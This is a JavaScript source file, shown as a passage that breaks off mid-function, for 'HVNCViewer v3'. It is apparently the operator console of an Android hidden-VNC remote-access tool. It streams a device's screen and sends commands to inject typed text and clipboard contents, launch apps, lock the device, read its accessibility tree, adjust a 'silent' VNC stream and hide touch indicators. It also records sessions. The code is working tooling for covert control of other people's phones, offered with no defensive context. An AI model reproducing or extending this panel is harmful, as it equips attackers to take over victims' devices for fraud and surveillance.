'use strict';
/**
 * HVNCViewer v3 — [K] upgraded
 *
 * Upgrades over v2:
 *  - Dual-worker decode pool (round-robin) — doubles decode throughput at high FPS
 *  - Stream stall auto-reconnect — if no frame arrives in 6s while running, refreshes
 *  - Canvas recording — capture VNC session as WebM, download with one click
 *  - Pan when zoomed — mouse drag pans canvas; pinch-to-pan on touch
 *  - Ripple animation on every TAP/LONG_PRESS — visual confirmation
 *  - DPI-aware canvas — devicePixelRatio scaling for crisp HiDPI rendering
 *  - Full-screen button — enters Fullscreen API on the container
 *  - Keyboard shortcut legend — press ? to show/hide
 *  - Better HUD — FPS graph, latency, dropped frames, decode queue, resolution
 *  - Quick-open app — ⚡ Launch button sends OPEN_APP with package name prompt
 *  - Hold-scroll — holding mouse button + moving emits continuous SWIPE at rate
 *  - All v2 bug fixes preserved (SWIPE_THRESHOLD 0.03, wheel delta ±0.25)
 */

// ── Decode worker source ──────────────────────────────────────────────────────
const _WORKER_SRC = `
self.onmessage = async ({ data: { seq, buf } }) => {
  try {
    const bmp = await createImageBitmap(
      new Blob([buf], { type: 'image/jpeg' }),
      { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
    );
    self.postMessage({ seq, bmp }, [bmp]);
  } catch {}
};
`;

// ── Dual worker pool ──────────────────────────────────────────────────────────
class WorkerPool {
  constructor(size = 2) {
    this._blob    = URL.createObjectURL(new Blob([_WORKER_SRC], { type: 'application/javascript' }));
    this._workers = Array.from({ length: size }, () => new Worker(this._blob));
    this._rr      = 0;
    this.onframe  = null; // callback(seq, bmp)
    this._workers.forEach(w => {
      w.onmessage = ({ data: { seq, bmp } }) => {
        if (this.onframe) this.onframe(seq, bmp);
      };
    });
  }
  post(seq, buf) {
    const w = this._workers[this._rr++ % this._workers.length];
    w.postMessage({ seq, buf }, [buf]);
  }
  destroy() {
    this._workers.forEach(w => w.terminate());
    URL.revokeObjectURL(this._blob);
  }
}

// ── FPS + latency HUD ─────────────────────────────────────────────────────────
class Hud {
  constructor(w = 100, h = 36, maxFps = 30) {
    this.w = w; this.h = h; this.maxFps = maxFps;
    this.hist  = new Array(w).fill(0); // fps samples
    this._lat  = -1;
    this._drop = 0;
    this._res  = '';
    this._q    = 0;
  }
  push(fps, dropped, res, q) {
    this.hist.shift();
    this.hist.push(Math.min(fps, this.maxFps));
    this._drop = dropped;
    this._res  = res;
    this._q    = q;
  }
  setLatency(ms) { this._lat = ms; }
  draw(ctx, x, y) {
    const { w, h, hist, maxFps } = this;
    const pad = 56;
    ctx.save();
    // background
    ctx.fillStyle = 'rgba(0,0,0,0.70)';
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(x, y, w + pad, h + 10, 5);
    else ctx.rect(x, y, w + pad, h + 10);
    ctx.fill();
    // bars
    for (let i = 0; i < w; i++) {
      const v  = hist[i];
      const bh = Math.round((v / maxFps) * h);
      ctx.fillStyle = `hsl(${120 * (v / maxFps)},80%,45%)`;
      ctx.fillRect(x + 2 + i, y + 5 + h - bh, 1, bh);
    }
    // text
    const cur = hist[w - 1];
    const fpsColor = cur >= 12 ? '#3dba7a' : cur >= 5 ? '#e0b84a' : '#e05c5c';
    ctx.font = 'bold 11px monospace'; ctx.fillStyle = fpsColor;
    ctx.fillText(`${cur.toFixed(1)}`, x + w + 6, y + 14);
    ctx.font = '8px monospace'; ctx.fillStyle = '#888';
    ctx.fillText('FPS', x + w + 6, y + 24);
    ctx.fillStyle = '#5a6aaa';
    ctx.fillText(this._lat >= 0 ? `${this._lat}ms` : '---', x + w + 6, y + 34);
    if (this._drop > 0) {
      ctx.fillStyle = '#e05c5c';
      ctx.fillText(`↓${this._drop}`, x + w + 32, y + 14);
    }
    if (this._res) {
      ctx.fillStyle = '#333366';
      ctx.fillText(this._res, x + 2, y + h + 14);
    }
    ctx.restore();
  }
}

// ── Ripple ────────────────────────────────────────────────────────────────────
class RippleEffect {
  constructor() { this._active = []; }
  spawn(x, y, long = false) {
    this._active.push({ x, y, r: 0, maxR: long ? 28 : 18, alpha: 1, long });
  }
  tick(ctx, cw, ch) {
    this._active = this._active.filter(r => r.alpha > 0.03);
    for (const r of this._active) {
      r.r     += (r.maxR - r.r) * 0.18;
      r.alpha *= 0.80;
      ctx.save();
      ctx.beginPath();
      ctx.arc(r.x * cw, r.y * ch, r.r, 0, Math.PI * 2);
      ctx.strokeStyle = r.long
        ? `rgba(255,180,60,${r.alpha})`
        : `rgba(80,220,255,${r.alpha})`;
      ctx.lineWidth = r.long ? 2 : 1.5;
      ctx.stroke();
      if (r.r < 5) {
        ctx.beginPath();
        ctx.arc(r.x * cw, r.y * ch, 3, 0, Math.PI * 2);
        ctx.fillStyle = r.long
          ? `rgba(255,180,60,${r.alpha * 0.6})`
          : `rgba(80,220,255,${r.alpha * 0.6})`;
        ctx.fill();
      }
      ctx.restore();
    }
  }
  get active() { return this._active.length > 0; }
}

// ── Shortcut Legend ───────────────────────────────────────────────────────────
const SHORTCUTS = [
  ['Ctrl+H', 'Home'],    ['Ctrl+B', 'Back'],     ['Ctrl+R', 'Recents'],
  ['Ctrl+V', 'Paste→Type'], ['Ctrl+S', 'Start'],  ['Ctrl+Q', 'Stop'],
  ['Esc', 'Back'],       ['F1', 'Home'],          ['F2', 'Recents'],
  ['F3', 'Quick Settings'], ['F5', 'Restart VNC'], ['↑↓←→', 'Swipe'],
  ['Enter', 'Inject \\n'], ['Backspace', 'Inject \\b'], ['?', 'This legend'],
  ['Right-click', 'Long press'], ['Scroll', 'Swipe scroll'], ['Ctrl+Scroll', 'Zoom'],
];

// ── HVNCViewer v3 ─────────────────────────────────────────────────────────────
class HVNCViewer {
  /**
   * @param {HTMLElement} container
   * @param {string}      deviceId
   * @param {Function}    sendFn
   * @param {{ frameW, frameH, screenW, screenH }} opts
   */
  constructor(container, deviceId, sendFn, opts = {}) {
    this.container = container;
    this.deviceId  = deviceId;
    this._send     = sendFn;

    this.frameW  = opts.frameW  ?? 360;
    this.frameH  = opts.frameH  ?? 780;
    this.screenW = opts.screenW ?? 1080;
    this.screenH = opts.screenH ?? 1920;

    this._zoom    = 1.0;
    this._pan     = { x: 0, y: 0 };
    this._quality = 50;
    this._mode    = 'vnc';
    this._running = false;
    this._lyReader = null;

    // Frame pipeline
    this._pool      = new WorkerPool(2);
    this._pending   = null;
    this._seq       = 0;
    this._latestSeq = -1;
    this._rafId     = null;
    this._dropped   = 0;
    this._decodeQ   = 0;

    this._pool.onframe = (seq, bmp) => {
      this._decodeQ = Math.max(0, this._decodeQ - 1);
      if (seq < this._latestSeq) { bmp.close(); this._dropped++; return; }
      this._latestSeq = seq;
      if (this._pending) { this._pending.close(); this._dropped++; }
      this._pending = bmp;
    };

    // Metrics
    this._times      = [];
    this._latencies  = [];
    this._hud        = new Hud(90, 28, 30);
    this._hudTimer   = setInterval(() => {
      this._hud.push(this.fps, this._dropped, `${this.frameW}×${this.frameH}`, this._decodeQ);
    }, 1000);
    this._showHud    = true;

    // Ripple
    this._ripple = new RippleEffect();

    // Stall detector
    this._lastFrameAt = 0;
    this._stallTimer  = null;

    // Recording
    this._recorder    = null;
    this._recChunks   = [];
    this._recording   = false;

    // Input state
    this._mouse   = { down: false, origin: null, t: 0, lastPos: null };
    this._pinch   = { dist: 0, active: false, midpoint: null };
    this._panning = false;
    this._panOrigin = null;
    this._holdScrollTimer = null;
    this._shortcutVisible = false;

    // Quality adaptation
    this._stableLow  = 0;
    this._stableHigh = 0;
    this._qaTimer    = setInterval(() => this._adaptQuality(), 1000);

    this._buildUI();
    this._bindInput();
    this._startRenderLoop();
    this._drawPlaceholder();
  }

  // ── UI ──────────────────────────────────────────────────────────────────────
  _buildUI() {
    this.container.innerHTML = `
    <div id="_hv_root" style="display:flex;flex-direction:column;width:100%;height:100%;background:#06060f;position:relative">

      <!-- TOP BAR -->
      <div id="_hv_topbar" style="
        display:flex;align-items:center;gap:6px;padding:5px 10px;
        background:#0b0b1a;border-bottom:1px solid #161628;flex-shrink:0;flex-wrap:wrap">

        <!-- Mode tabs -->
        <div style="display:flex;border:1px solid #1a1a30;border-radius:6px;overflow:hidden">
          <button class="_hvmode active" data-mode="vnc">VNC</button>
          <button class="_hvmode"        data-mode="v2">V2</button>
          <button class="_hvmode"        data-mode="duplo">DUPLO</button>
          <button class="_hvmode"        data-mode="radar" style="color:#3dba7a" title="LyReader — accessibility tree">Ly</button>
        </div>

        <!-- Start / Stop -->
        <button id="_hv_start" class="_hvaction" style="border-color:#3dba7a;color:#3dba7a">▶ START</button>
        <button id="_hv_stop"  class="_hvaction" style="border-color:#e05c5c;color:#e05c5c">⏹ STOP</button>

        <div class="_hvdiv"></div>

        <!-- Quality -->
        <span class="_hvlabel">Q</span>
        <input type="range" id="_hv_q" min="10" max="85" value="50" step="5" style="width:72px;accent-color:#7c6af7">
        <span id="_hv_ql" class="_hvlabel" style="color:#7c6af7;width:28px">50%</span>

        <!-- Zoom -->
        <span class="_hvlabel">Z</span>
        <input type="range" id="_hv_zoom" min="50" max="400" value="100" step="10" style="width:68px;accent-color:#3dba7a">
        <span id="_hv_zl" class="_hvlabel" style="color:#3dba7a;width:36px">100%</span>
        <button id="_hv_zreset" class="_hvmini">1:1</button>

        <span style="flex:1"></span>

        <!-- Recording -->
        <button id="_hv_recbtn" class="_hvmini" style="border-color:#e05c5c;color:#e05c5c" title="Record VNC session as WebM">⏺ REC</button>

        <!-- Fullscreen -->
        <button id="_hv_fsbtn" class="_hvmini" title="Fullscreen">⛶</button>

        <!-- Help -->
        <button id="_hv_helpbtn" class="_hvmini" title="Keyboard shortcuts">?</button>

        <!-- Status -->
        <div id="_hv_status" style="font-size:10px;color:#2a2a44;background:#0b0b1a;border:1px solid #161628;border-radius:4px;padding:2px 8px">IDLE</div>
      </div>

      <!-- GESTURE BAR -->
      <div id="_hv_gestures" style="
        display:flex;align-items:center;gap:3px;padding:4px 8px;
        background:#080814;border-bottom:1px solid #111120;flex-shrink:0;flex-wrap:wrap">

        <button class="_hvbtn" data-cmd="BACK">← Back</button>
        <button class="_hvbtn" data-cmd="HOME">⌂ Home</button>
        <button class="_hvbtn" data-cmd="RECENTS">⧉ Recent</button>
        <button class="_hvbtn" data-cmd="NOTIFICATIONS">🔔 Notifs</button>
        <button class="_hvbtn" data-cmd="QUICK_SETTINGS">⚙ QS</button>
        <div class="_hvdiv"></div>
        <button class="_hvbtn" data-cmd="WAKEUP">☀ Wake</button>
        <button class="_hvbtn" data-cmd="LOCK_DEVICE">🔒 Lock</button>
        <button class="_hvbtn" data-cmd="POWER_MENU">⏻ Power</button>
        <button class="_hvbtn" data-cmd="VOLUME_UP">🔊+</button>
        <button class="_hvbtn" data-cmd="VOLUME_DOWN">🔉−</button>
        <div class="_hvdiv"></div>
        <button class="_hvbtn" data-cmd="SNAP_SCREEN">📷 Snap</button>
        <button id="_hv_typebtn"    class="_hvmini">⌨ Type</button>
        <button id="_hv_pastebtn"   class="_hvmini">📋 Paste</button>
        <button id="_hv_launchbtn"  class="_hvmini" title="Open app by package name">⚡ Launch</button>
        <button id="_hv_hierarchybtn" class="_hvmini">🌳 Hier</button>
        <div class="_hvdiv"></div>
        <button id="_hv_restartbtn" class="_hvmini" style="border-color:#7c4af7;color:#7c4af7">↺ Restart</button>
        <button id="_hv_refreshbtn" class="_hvmini" style="border-color:#3dba7a;color:#3dba7a">🔄 Refresh</button>
        <div class="_hvdiv"></div>
        <button id="_hv_touchtoggle" class="_hvmini">👁 Touch: OFF</button>
        <span style="flex:1"></span>
        <button id="_hv_overlayToggle" style="background:none;border:none;color:#2a2a40;font-size:10px;cursor:pointer">HUD</button>
      </div>

      <!-- CANVAS AREA -->
      <div id="_hv_canvasrow" style="flex:1;overflow:hidden;display:flex;align-items:stretch;justify-content:center;background:#06060f;position:relative">
        <!-- Primary -->
        <div id="_hv_mainpanel" style="flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative">
          <canvas id="_hv_cv" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none;
            transform-origin:center center;image-rendering:auto"></canvas>
        </div>
        <!-- V2 (DUPLO right) -->
        <div id="_hv_v2panel" style="flex:1;display:none;align-items:center;justify-content:center;overflow:hidden;border-left:1px solid #161628">
          <div style="font-size:9px;color:#2a2a44;position:absolute;top:4px;left:8px">V2</div>
          <canvas id="_hv_cv2" style="max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;outline:none;user-select:none;touch-action:none"></canvas>
        </div>
        <!-- LyReader -->
        <div id="_hv_radarpanel" style="flex:1;display:none;position:relative;overflow:hidden;border-left:1px solid #161628"></div>
      </div>

      <!-- SHORTCUT LEGEND (overlay) -->
      <div id="_hv_legend" style="
        display:none;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
        background:#0b0b1a;border:1px solid #2a2a50;border-radius:8px;
        padding:14px 18px;z-index:100;min-width:320px;max-width:90%">
        <div style="font-size:12px;color:#7c6af7;font-weight:700;margin-bottom:10px">⌨ Keyboard Shortcuts</div>
        <div id="_hv_legend_grid" style="display:grid;grid-template-columns:1fr 1fr;gap:3px 14px;font-size:10px;font-family:monospace"></div>
        <div style="margin-top:10px;font-size:9px;color:#2a2a40">Press ? to close</div>
      </div>
    </div>

    <style>
      ._hvmode {
        background:none;border:none;color:#333;padding:3px 10px;
        font-size:11px;font-weight:700;cursor:pointer;transition:background .12s;
      }
      ._hvmode.active { background:#161630;color:#7c6af7; }
      ._hvmode:hover:not(.active) { background:#0e0e22;color:#555; }
      ._hvbtn {
        background:#0b0b1a;border:1px solid #191930;color:#666;
        border-radius:4px;padding:2px 7px;font-size:10px;cursor:pointer;
        transition:background .1s,color .1s,border-color .1s;
      }
      ._hvbtn:hover { background:#161628;color:#999;border-color:#252550; }
      ._hvbtn:active { background:#1e1e38; }
      ._hvaction {
        background:#0b0b1a;border:1px solid;
        border-radius:5px;padding:4px 12px;font-size:11px;font-weight:700;cursor:pointer;
        transition:opacity .12s;
      }
      ._hvaction:hover { opacity:.85; }
      ._hvmini {
        background:#0b0b1a;border:1px solid #191930;color:#666;
        border-radius:4px;padding:2px 7px;font-size:10px;cursor:pointer;
        transition:background .1s,color .1s;
      }
      ._hvmini:hover { background:#161628;color:#999; }
      ._hvdiv { width:1px;height:16px;background:#161628;margin:0 2px; }
      ._hvlabel { font-size:10px;color:#444; }
    </style>`;

    this.canvas  = this.container.querySelector('#_hv_cv');
    this.canvas2 = this.container.querySelector('#_hv_cv2');

    // DPI-aware sizing
    const dpr = window.devicePixelRatio || 1;
    this.canvas.width   = this.frameW * dpr;
    this.canvas.height  = this.frameH * dpr;
    this.canvas2.width  = this.frameW * dpr;
    this.canvas2.height = this.frameH * dpr;
    this.canvas.style.width   = this.frameW + 'px';
    this.canvas.style.height  = this.frameH + 'px';
    this.canvas2.style.width  = this.frameW + 'px';
    this.canvas2.style.height = this.frameH + 'px';
    this._dpr = dpr;

    this.ctx  = this.canvas.getContext('2d',  { alpha: false, desynchronized: true });
    this.ctx2 = this.canvas2.getContext('2d', { alpha: false, desynchronized: true });
    this.ctx.scale(dpr, dpr);
    this.ctx2.scale(dpr, dpr);
    this.canvas.focus();

    // Build shortcut grid
    const grid = this.container.querySelector('#_hv_legend_grid');
    for (const [k, v] of SHORTCUTS) {
      grid.innerHTML += `<span style="color:#7c6af7">${k}</span><span style="color:#888">${v}</span>`;
    }

    this._bindToolbar();
  }

  _bindToolbar() {
    const c = this.container;

    // Mode selector
    c.querySelectorAll('._hvmode').forEach(btn => {
      btn.addEventListener('click', () => {
        c.querySelectorAll('._hvmode').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const wasRunning = this._running;
        if (wasRunning) this.stop();
        this._mode = btn.dataset.mode;

        const v2    = c.querySelector('#_hv_v2panel');
        const radar = c.querySelector('#_hv_radarpanel');
        const main  = c.querySelector('#_hv_mainpanel');

        v2.style.display    = 'none';
        radar.style.display = 'none';
        main.style.display  = 'flex';

        if (this._mode === 'duplo') {
          v2.style.display = 'flex';
        } else if (this._mode === 'radar') {
          main.style.display  = 'none';
          radar.style.display = 'block';
          if (!this._lyReader && typeof LyReader !== 'undefined') {
            this._lyReader = new LyReader(radar, this.deviceId, obj => this._send(obj), this.screenW, this.screenH);
          }
        }
        if (wasRunning) setTimeout(() => this.start(), 180);
      });
    });

    c.querySelector('#_hv_start').addEventListener('click', () => this.start());
    c.querySelector('#_hv_stop' ).addEventListener('click', () => this.stop());

    // Quality
    const qSl = c.querySelector('#_hv_q');
    const qLb = c.querySelector('#_hv_ql');
    qSl.addEventListener('input', () => {
      this._quality = +qSl.value;
      qLb.textContent = this._quality + '%';
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
    });

    // Zoom
    const zSl = c.querySelector('#_hv_zoom');
    const zLb = c.querySelector('#_hv_zl');
    zSl.addEventListener('input', () => {
      this._zoom = +zSl.value / 100;
      zLb.textContent = zSl.value + '%';
      this._applyTransform();
    });
    c.querySelector('#_hv_zreset').addEventListener('click', () => {
      this._zoom = 1; this._pan = { x:0, y:0 };
      zSl.value = 100; zLb.textContent = '100%';
      this._applyTransform();
    });

    // Nav / system buttons
    c.querySelectorAll('._hvbtn').forEach(btn => btn.addEventListener('click', () => this._cmd(btn.dataset.cmd, {})));

    // Type
    c.querySelector('#_hv_typebtn').addEventListener('click', () => {
      const t = prompt('Text to inject:');
      if (t !== null && t.length) this._cmd('TYPE', { text: t });
    });

    // Paste
    c.querySelector('#_hv_pastebtn').addEventListener('click', () => {
      const inject = text => {
        this._cmd('SET_CLIPBOARD', { text });
        setTimeout(() => this._cmd('TYPE', { text }), 80);
      };
      navigator.clipboard.readText().then(inject).catch(() => {
        const t = prompt('Paste text (clipboard denied):');
        if (t) inject(t);
      });
    });

    // Launch app
    c.querySelector('#_hv_launchbtn').addEventListener('click', () => {
      const pkg = prompt('Package name (e.g. com.android.chrome):');
      if (pkg?.trim()) this._cmd('OPEN_APP', { package: pkg.trim() });
    });

    // Hierarchy
    c.querySelector('#_hv_hierarchybtn').addEventListener('click', () => this._cmd('REQUEST_HIERARCHY', {}));

    // VNC Restart
    c.querySelector('#_hv_restartbtn').addEventListener('click', () => {
      this._cmd('FORCE_RESTART_VNC', {});
      const was = this._running;
      if (was) this.stop();
      setTimeout(() => { if (was) this.start(); }, 650);
    });

    // Refresh
    c.querySelector('#_hv_refreshbtn').addEventListener('click', () => {
      if (this._running) { this.stop(); setTimeout(() => this.start(), 300); }
      else this.start();
    });

    // Touch visibility
    let touchVis = false;
    const tb = c.querySelector('#_hv_touchtoggle');
    tb.addEventListener('click', () => {
      touchVis = !touchVis;
      tb.textContent = `👁 Touch: ${touchVis ? 'ON' : 'OFF'}`;
      tb.style.color = touchVis ? '#3dba7a' : '#666';
      tb.style.borderColor = touchVis ? '#3dba7a' : '#191930';
      this._cmd('TOGGLE_TOUCH_VISIBILITY', { visible: touchVis });
    });

    // HUD toggle
    c.querySelector('#_hv_overlayToggle').addEventListener('click', () => {
      this._showHud = !this._showHud;
    });

    // Recording
    c.querySelector('#_hv_recbtn').addEventListener('click', () => this._toggleRecording());

    // Fullscreen
    c.querySelector('#_hv_fsbtn').addEventListener('click', () => {
      const el = c.querySelector('#_hv_root');
      if (!document.fullscreenElement) el.requestFullscreen?.();
      else document.exitFullscreen?.();
    });

    // Shortcut legend
    c.querySelector('#_hv_helpbtn').addEventListener('click', () => this._toggleLegend());
  }

  _toggleLegend() {
    this._shortcutVisible = !this._shortcutVisible;
    const leg = this.container.querySelector('#_hv_legend');
    if (leg) leg.style.display = this._shortcutVisible ? 'block' : 'none';
  }

  _applyTransform() {
    // pan is in CSS pixels relative to canvas center
    const t = `scale(${this._zoom}) translate(${this._pan.x / this._zoom}px, ${this._pan.y / this._zoom}px)`;
    this.canvas.style.transform = t;
  }

  // ── Recording ──────────────────────────────────────────────────────────────
  _toggleRecording() {
    const btn = this.container.querySelector('#_hv_recbtn');
    if (!this._recording) {
      try {
        const stream = this.canvas.captureStream(20);
        this._recorder  = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        this._recChunks = [];
        this._recorder.ondataavailable = e => { if (e.data.size > 0) this._recChunks.push(e.data); };
        this._recorder.onstop = () => this._saveRecording();
        this._recorder.start(500);
        this._recording = true;
        if (btn) { btn.textContent = '⏹ STOP REC'; btn.style.color = '#ff4444'; }
      } catch (e) {
        alert('Recording not supported: ' + e.message);
      }
    } else {
      this._recorder?.stop();
      this._recording = false;
      if (btn) { btn.textContent = '⏺ REC'; btn.style.color = '#e05c5c'; }
    }
  }

  _saveRecording() {
    const blob = new Blob(this._recChunks, { type: 'video/webm' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = `vnc_${this.deviceId}_${Date.now()}.webm`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 5000);
  }

  // ── Stall detector ─────────────────────────────────────────────────────────
  _startStallDetector() {
    this._lastFrameAt = Date.now();
    this._stallTimer  = setInterval(() => {
      if (!this._running) return;
      if (Date.now() - this._lastFrameAt > 6000) {
        // No frame in 6s — soft reconnect
        this._setStatus('STALL→RECONNECT', '#e0b84a');
        this.stop();
        setTimeout(() => { if (!this._running) this.start(); }, 500);
      }
    }, 2000);
  }

  _stopStallDetector() {
    clearInterval(this._stallTimer);
    this._stallTimer = null;
  }

  // ── Start / Stop ──────────────────────────────────────────────────────────
  start() {
    if (this._running) return;
    this._running = true;
    this._setStatus('LIVE', '#3dba7a');
    this._startStallDetector();

    switch (this._mode) {
      case 'vnc':
        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
        break;
      case 'v2':
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;
      case 'duplo':
        this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
        this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
        break;
      case 'radar':
        if (this._lyReader) {
          this._lyReader.startPolling(700);
        } else if (typeof LyReader !== 'undefined') {
          const rp = this.container.querySelector('#_hv_radarpanel');
          if (rp) {
            this._lyReader = new LyReader(rp, this.deviceId, obj => this._send(obj), this.screenW, this.screenH);
            this._lyReader.startPolling(700);
          }
        } else {
          this._send({ type: 'cmd', target: this.deviceId, cmd: 'REQUEST_HIERARCHY', args: {} });
        }
        break;
    }
  }

  stop() {
    if (!this._running) return;
    this._running = false;
    this._setStatus('IDLE', '#2a2a44');
    this._stopStallDetector();

    switch (this._mode) {
      case 'vnc':
        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId }); break;
      case 'v2':
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId }); break;
      case 'duplo':
        this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId });
        this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
        break;
      case 'radar':
        if (this._lyReader) this._lyReader.stopPolling(); break;
    }
    this._drawPlaceholder();
  }

  _setStatus(label, color) {
    const el = this.container.querySelector('#_hv_status');
    if (el) { el.textContent = label; el.style.color = color; el.style.borderColor = color + '44'; }
  }

  // ── Frame receive ─────────────────────────────────────────────────────────
  onFrame(jpegBuf, serverTs, isV2 = false) {
    const seq = ++this._seq;
    const now = performance.now();
    this._lastFrameAt = Date.now();

    this._times.push(now);
    if (this._times.length > 60) this._times.shift();

    if (serverTs > 0) {
      const lat = Date.now() - serverTs;
      if (lat >= 0 && lat < 8000) {
        this._latencies.push(lat);
        if (this._latencies.length > 30) this._latencies.shift();
        this._hud.setLatency(Math.round(this._latencies.reduce((a, b) => a + b, 0) / this._latencies.length));
      }
    }

    if (isV2 && this._mode === 'duplo') {
      createImageBitmap(new Blob([jpegBuf], { type: 'image/jpeg' }),
        { premultiplyAlpha: 'none', colorSpaceConversion: 'none' })
      .then(bmp => {
        this.ctx2.drawImage(bmp, 0, 0, this.canvas2.width / this._dpr, this.canvas2.height / this._dpr);
        bmp.close();
      }).catch(() => {});
      return;
    }

    this._decodeQ++;
    this._pool.post(seq, jpegBuf);
  }

  // ── LyReader receive ──────────────────────────────────────────────────────
  onHierarchy(data) {
    if (this._mode !== 'radar') return;
    if (!this._lyReader) {
      const rp = this.container.querySelector('#_hv_radarpanel');
      if (rp && typeof LyReader !== 'undefined') {
        this._lyReader = new LyReader(rp, this.deviceId, obj => this._send(obj), this.screenW, this.screenH);
      }
    }
    if (this._lyReader) this._lyReader.update(data);
  }

  // ── Metrics ───────────────────────────────────────────────────────────────
  get fps() {
    const t = this._times;
    if (t.length < 2) return 0;
    const span = t[t.length - 1] - t[0];
    return span > 0 ? (t.length - 1) / (span / 1000) : 0;
  }

  // ── Render loop ───────────────────────────────────────────────────────────
  _startRenderLoop() {
    const tick = () => {
      this._rafId = requestAnimationFrame(tick);

      if (this._pending) {
        this.ctx.drawImage(this._pending, 0, 0, this.canvas.width / this._dpr, this.canvas.height / this._dpr);
        this._pending.close();
        this._pending = null;
      }

      if (this._showHud) this._hud.draw(this.ctx, 4, 4);
      if (this._cursor)  this._drawCursor();

      if (this._ripple.active) {
        this._ripple.tick(this.ctx, this.canvas.width / this._dpr, this.canvas.height / this._dpr);
      }
    };
    this._rafId = requestAnimationFrame(tick);
  }

  _drawCursor() {
    const { x, y } = this._cursor;
    const cw = this.canvas.width  / this._dpr;
    const ch = this.canvas.height / this._dpr;
    const cx = x * cw, cy = y * ch;
    const c  = this.ctx;
    c.save();
    c.strokeStyle = 'rgba(255,60,60,0.80)';
    c.lineWidth   = 1.5;
    c.beginPath();
    c.moveTo(cx - 11, cy); c.lineTo(cx - 4, cy);
    c.moveTo(cx + 4, cy);  c.lineTo(cx + 11, cy);
    c.moveTo(cx, cy - 11); c.lineTo(cx, cy - 4);
    c.moveTo(cx, cy + 4);  c.lineTo(cx, cy + 11);
    c.stroke();
    c.beginPath();
    c.arc(cx, cy, 3, 0, Math.PI * 2);
    c.strokeStyle = 'rgba(255,100,100,0.65)';
    c.lineWidth   = 1;
    c.stroke();
    if (this._mouse.down) {
      c.beginPath();
      c.arc(cx, cy, 10, 0, Math.PI * 2);
      c.strokeStyle = 'rgba(255,80,80,0.42)';
      c.lineWidth   = 1.5;
      c.stroke();
    }
    c.restore();
  }

  _drawPlaceholder() {
    const c  = this.ctx;
    const w  = this.canvas.width  / this._dpr;
    const h  = this.canvas.height / this._dpr;
    c.fillStyle = '#06060f';
    c.fillRect(0, 0, w, h);
    c.strokeStyle = '#161630';
    c.lineWidth   = 1.5;
    c.beginPath();
    if (c.roundRect) c.roundRect(w/2 - 80, h/2 - 140, 160, 280, 14);
    else c.rect(w/2 - 80, h/2 - 140, 160, 280);
    c.stroke();
    c.fillStyle = '#252545';
    c.font      = 'bold 12px monospace';
    c.textAlign = 'center';
    c.fillText('Press ▶ START', w/2, h/2 + 10);
    c.font = '10px monospace'; c.fillStyle = '#161630';
    c.fillText(this._mode.toUpperCase(), w/2, h/2 + 28);
    c.textAlign = 'left';
  }

  // ── Quality adaptation ────────────────────────────────────────────────────
  _adaptQuality() {
    const fps = this.fps;
    if (fps === 0) { this._stableLow = this._stableHigh = 0; return; }
    if (fps < 4)       { this._stableLow++;  this._stableHigh = 0; }
    else if (fps > 18) { this._stableHigh++; this._stableLow  = 0; }
    else               { this._stableLow = this._stableHigh = 0; }

    if (this._stableLow >= 6 && this._quality > 15) {
      this._quality = Math.max(15, this._quality - 10);
      this._syncQSlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableLow = 0;
    }
    if (this._stableHigh >= 8 && this._quality < 80) {
      this._quality = Math.min(80, this._quality + 5);
      this._syncQSlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableHigh = 0;
    }
  }

  _syncQSlider() {
    const sl = this.container.querySelector('#_hv_q');
    const lb = this.container.querySelector('#_hv_ql');
    if (sl) sl.value = this._quality;
    if (lb) lb.textContent = this._quality + '%';
  }

  // ── Coordinate mapping ────────────────────────────────────────────────────
  _mapCoords(clientX, clientY) {
    const r  = this.canvas.getBoundingClientRect();
    const fw = this.frameW, fh = this.frameH;
    const sx = (fw / r.width)  / this._zoom;
    const sy = (fh / r.height) / this._zoom;
    return {
      x: Math.max(0, Math.min(1, ((clientX - r.left) * sx) / fw)),
      y: Math.max(0, Math.min(1, ((clientY - r.top)  * sy) / fh)),
    };
  }

  // ── Commands ──────────────────────────────────────────────────────────────
  _cmd(cmd, args = {}) { this._send({ type: 'cmd', target: this.deviceId, cmd, args }); }
  _sendOp(obj)         { this._send(obj); }

  // ── Input ─────────────────────────────────────────────────────────────────
  _bindInput() {
    const c = this.canvas;
    const SWIPE_THRESHOLD = 0.03;

    this._cursor = null;
    c.addEventListener('mousemove', e => {
      this._cursor = this._mapCoords(e.clientX, e.clientY);

      // Pan when zoomed and dragging (middle mouse or zoom > 1 + right btn or pan mode)
      if (this._panning && this._panOrigin) {
        const dx = e.clientX - this._panOrigin.x;
        const dy = e.clientY - this._panOrigin.y;
        this._pan.x = this._panOriginVal.x + dx;
        this._pan.y = this._panOriginVal.y + dy;
        this._applyTransform();
        return;
      }

      // Hold-scroll while mouse down
      if (this._mouse.down && this._mouse.origin) {
        clearTimeout(this._holdScrollTimer);
        this._holdScrollTimer = setTimeout(() => {
          if (!this._mouse.down) return;
          const pos  = this._mapCoords(e.clientX, e.clientY);
          const dx   = pos.x - this._mouse.origin.x;
          const dy   = pos.y - this._mouse.origin.y;
          if (Math.hypot(dx, dy) > SWIPE_THRESHOLD) {
            this._cmd('SWIPE', {
              x1: this._mouse.origin.x, y1: this._mouse.origin.y,
